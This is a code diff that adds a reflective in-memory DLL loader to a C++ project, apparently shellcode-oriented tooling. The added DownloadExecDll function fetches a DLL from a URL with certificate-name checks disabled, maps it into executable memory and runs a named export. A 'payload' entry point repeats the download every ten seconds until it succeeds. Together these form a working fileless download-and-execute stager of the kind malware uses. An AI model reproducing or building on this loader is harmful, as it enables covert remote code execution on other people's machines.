@@ -1,7 +1,15 @@
 #include "include/LoadLibrary.h"
 #include "include/WinAPIShellcode.cpp"
 
-extern "C" {
+/*!
+ * \brief
+ * Loads A DLL from a string buffer
+ * \param [in] buffer
+ * The buffer containing a dll data
+ * \param [in] length
+ * The length of the buffer
+ * @returns The address of the loaded dll
+ */
 HMODULE LoadLibraryFomMem(char *buffer, size_t length)
 {
 	if(buffer == NULL) return 0;
@@ -38,7 +46,7 @@ HMODULE LoadLibraryFomMem(char *buffer, size_t length)
   headerlen += sizeof(IMAGE_DOS_HEADER) - DOS_HEADER->e_lfanew;
   if(length < headerlen + sizeof(IMAGE_SECTION_HEADER) * NT_HEADERS->FileHeader.NumberOfSections) {
 #ifdef DEBUG
-  		std::cerr << "file truncated" << std::endl;
+  		std::cerr << "file truncated 1" << std::endl;
 #endif
 		  return NULL;
   }
@@ -55,7 +63,7 @@ HMODULE LoadLibraryFomMem(char *buffer, size_t length)
 		  low = section->VirtualAddress;
 		if(length < section->PointerToRawData + section->SizeOfRawData) {
 #ifdef DEBUG
-		  		std::cerr << "file truncated" << std::endl;
+		  		std::cerr << "file truncated 2" << std::endl;
 #endif
 					return NULL;
 			}
@@ -105,8 +113,16 @@ HMODULE LoadLibraryFomMem(char *buffer, size_t length)
 #endif
 	return (HMODULE)ImageBase;
 }
-}
-extern "C" {
+
+/*!
+ * \brief
+ * Gets the address of an export from a dll loaded by LoadLibraryFomMem
+ * \param [in] hModule
+ * The value retured by LoadLibraryFomMem
+ * \param [in] lpProcName
+ The export name
+ * @returns The address of the export
+ */
 FARPROC GetProcAddressFomMem(HMODULE hModule, LPCSTR  lpProcName)
 {
 	if(hModule == NULL)
@@ -123,6 +139,11 @@ FARPROC GetProcAddressFomMem(HMODULE hModule, LPCSTR  lpProcName)
 	}
 	for(DWORD exportnb=0; exportnb < exportdir->NumberOfNames; exportnb++) {
 			LPDWORD name = (LPDWORD)((char *)hModule + exportdir->AddressOfNames + sizeof(DWORD) * exportnb);
+#ifdef DEBUG
+	std::cout << (char *)hModule + name[0] << std::endl;
+	std::cout << lpProcName << std::endl;
+	std::cout << mystrcmp((char *)hModule + name[0], (char *)lpProcName) << std::endl;
+#endif
 	if(mystrcmp((char *)hModule + name[0], (char *)lpProcName)) {
 				LPDWORD funcaddr = (LPDWORD)((char *)hModule + exportdir->AddressOfFunctions + sizeof(DWORD) * exportnb);
 				return (FARPROC)((char *)hModule + funcaddr[0]);
@@ -130,41 +151,119 @@ FARPROC GetProcAddressFomMem(HMODULE hModule, LPCSTR  lpProcName)
 	}
 	return NULL;
 }
-}
 
+void *ConcatBuffer(void *buffer, size_t bufferlength, void* data, size_t datasize)
+{
+	//Sanityze input
+	void *retval = MyVirtualAlloc(NULL, bufferlength + datasize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+	if(retval == NULL) {
+		return NULL;
+	}
+	CopyMemory(retval, buffer, bufferlength);
+	CopyMemory((char *)retval + bufferlength, data, datasize);
+	MyVirtualFree(data, 0, MEM_RELEASE);
+	return retval;
+}
+/*!
+ * \brief
+ * Loads a dll from an url and execute export by name
+ * \param [in] url
+ * The url of the dll
+ * \param [in] functioname
+ * The export name
+ */
 bool DownloadExecDll(char *url, char *functioname)
 {
+#ifdef DEBUG
+	std::cout << "Downloading: " << url << std::endl;
+#endif
+	char tempbuffer[1024];
+	size_t length = 0;
+	DWORD retval;
+	void *data = MyVirtualAlloc(NULL, sizeof(tempbuffer), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+	HINTERNET WEB_CONNECT = MyInternetOpenA(NULL, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
+	if(WEB_CONNECT == NULL) {
+#ifdef DEBUG
+		std::cerr << "MyInternetOpenA failed: " << GetLastError() << std::endl;
+#endif
+		MyVirtualFree(data, 0, MEM_RELEASE);
+		return FALSE;
+	}
+	HINTERNET WEB_ADDRESS = MyInternetOpenUrlA(WEB_CONNECT, url, NULL, 0, INTERNET_FLAG_KEEP_CONNECTION|INTERNET_FLAG_IGNORE_CERT_CN_INVALID|INTERNET_FLAG_NO_CACHE_WRITE|INTERNET_FLAG_PRAGMA_NOCACHE, 0);
+	if(WEB_ADDRESS == NULL) {
+		MyInternetCloseHandle(WEB_CONNECT);
+#ifdef DEBUG
+		std::cerr << "MyInternetOpenUrlA failed: " << GetLastError() << std::endl;
+#endif
+		MyVirtualFree(data, 0, MEM_RELEASE);
+		return FALSE;
+	}
+	DWORD counter = 0;
+	do {
+		if(MyInternetReadFile(WEB_ADDRESS, tempbuffer, sizeof(tempbuffer), &retval) && retval > 0) {
+			data = ConcatBuffer(data, length, tempbuffer, retval);
+			length += retval;
+		} else {
+			counter++;
+			MySleep(1000);
+			if(counter > 10) {
+#ifdef DEBUG
+				std::cerr << "Connexion broken..." << std::endl;
+#endif
+				MyVirtualFree(data, 0, MEM_RELEASE);
+				return FALSE;
+			}
+		}
+	} while(retval > 0 && data != NULL);
+#ifdef DEBUG
+	std::cout << length << " bytes retreived" << std::endl;
+#endif
+	MyInternetCloseHandle(WEB_ADDRESS);
+	MyInternetCloseHandle(WEB_CONNECT);
+	if(data == NULL) {
+#ifdef DEBUG
+		std::cerr << "data empty" << std::endl;
+#endif
+		MyVirtualFree(data, 0, MEM_RELEASE);
+		return FALSE;
+	}
+	typedef void (WINAPI *_hello)(void);
+	HMODULE mylib = LoadLibraryFomMem((char *)data, length);
+	MyVirtualFree(data, 0, MEM_RELEASE);
+#ifdef DEBUG
+	std::cout << std::hex << mylib << std::endl;
+#endif
+	_hello hello = (_hello)GetProcAddressFomMem(mylib, functioname);
+	if(hello != NULL) {
+		hello();
+		return TRUE;
+	}
+#ifdef DEBUG
+	std::cout << "Failed to get proc addres" << std::endl;
+#endif
+	return FALSE;
+}
 
+extern "C" {
+void payload(void) {
+#if defined(_WIN64)
+	char url[] = "https://./build/hello64.dll";
+#elif defined(_WIN32)
+	char url[] = "file://./build/hello32.dll";
+#endif
+	char functioname[] = "a";
+	while(!DownloadExecDll(url, functioname)) {
+#ifdef DEBUG
+		std::cerr << "failed to download executable" << std::endl;
+#endif
+		MySleep(10000);
+	}
+}
 }
 
 #ifdef DEBUG
 int main(int argc, char **argv)
 {
-	#if defined(_WIN64)
-		std::ifstream infile("build/hello64.dll", std::ios::binary);
-	#elif defined(_WIN32)
-		std::ifstream infile("build/hello32.dll", std::ios::binary);
-	#endif
-	HMODULE mylib = NULL;
-	if(infile.is_open()) {
-		infile.seekg (0, infile.end);
-		size_t length = infile.tellg();
-		infile.seekg (0, infile.beg);
-		char *buffer = new char[length];
-		infile.read(buffer, length);
-		mylib = LoadLibraryFomMem(buffer, length);
-		delete[] buffer;
-	}
-	infile.close();
-	typedef void (WINAPI *_hello)(void);
-	_hello hello = (_hello)GetProcAddressFomMem(mylib, "hello");
-	if(hello != NULL)
-		hello();
-	return 0;
-}
-#else
-extern "C" {
-void payload(void) {
-}
+	payload();
 }
 #endif
